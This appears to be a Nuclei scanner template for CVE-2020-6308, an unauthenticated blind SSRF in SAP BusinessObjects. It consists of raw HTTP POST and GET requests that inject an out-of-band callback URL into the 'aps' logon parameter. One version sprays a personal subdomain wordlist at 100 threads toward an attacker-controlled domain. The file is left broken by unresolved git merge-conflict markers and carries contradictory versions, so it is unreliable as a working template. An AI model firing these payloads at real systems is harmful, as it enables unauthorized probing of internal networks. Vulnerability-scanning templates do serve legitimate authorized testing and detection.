id: CVE-2020-6308

info:
  name: SAP - Unauthenticated Blind SSRF
  author: madrobot
  severity: medium
<<<<<<< HEAD
<<<<<<< HEAD
  description: SAP BusinessObjects Business Intelligence Platform (Web Services) versions - 410, 420, 430, allows an unauthenticated attacker to inject arbitrary values as CMS parameters to perform lookups on the internal network which is otherwise not accessible externally. On successful exploitation, attacker can scan internal network to determine internal infrastructure and gather information for further attacks like remote file inclusion, retrieve server files, bypass firewall and force the vulnerable server to perform malicious requests, resulting in a Server-Side Request Forgery vulnerability.
=======
  description: |
   SAP BusinessObjects Business Intelligence Platform (Web Services) versions - 410, 420, 430, allows an unauthenticated attacker to inject arbitrary values as CMS parameters to perform lookups on the internal network which is otherwise not accessible externally. On successful exploitation, attacker can scan internal network to determine internal infrastructure and gather information for further attacks like remote file inclusion, retrieve server files, bypass firewall and force the vulnerable server to perform malicious requests, resulting in a Server-Side Request Forgery vulnerability.
>>>>>>> 5d36d276 (add new stuff)
  reference:
    - https://github.com/InitRoot/CVE-2020-6308-PoC
    - https://launchpad.support.sap.com/#/notes/2943844
    - https://wiki.scn.sap.com/wiki/pages/viewpage.action?pageId=558632196
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2020-6308
    cwe-id: CWE-918
<<<<<<< HEAD
  tags: cve,cve2020,sap,ssrf,oast,blind
=======
  tags: cve,cve2020,sap,ssrf,oast,unauth
>>>>>>> 5d36d276 (add new stuff)

requests:
  - raw:
      - |
        POST /AdminTools/querybuilder/logon?framework= HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        aps={{interactsh-url}}&usr=anything&pwd=anything&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"

      - type: word
        part: location
        words:
          - "{{BaseURL}}/AdminTools/querybuilder/logonform.jsp"
=======
  reference: https://github.com/InitRoot/CVE-2020-6308-PoC
  tags: cve,cve2020,sap,ssrf,oob

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100

    raw:
      - |
        GET /AdminTools/querybuilder/logon?framework= HTTP/1.1
        Host: {{Subdomains}}
        Connection: close
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
        
        aps=http://{{Host}}.{{Port}}.{{Subdomains}}.2020.6308.{{MY-DOMAIN}}&usr=admin&pwd=admin&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp
>>>>>>> 18ddf72b (add new stuff)
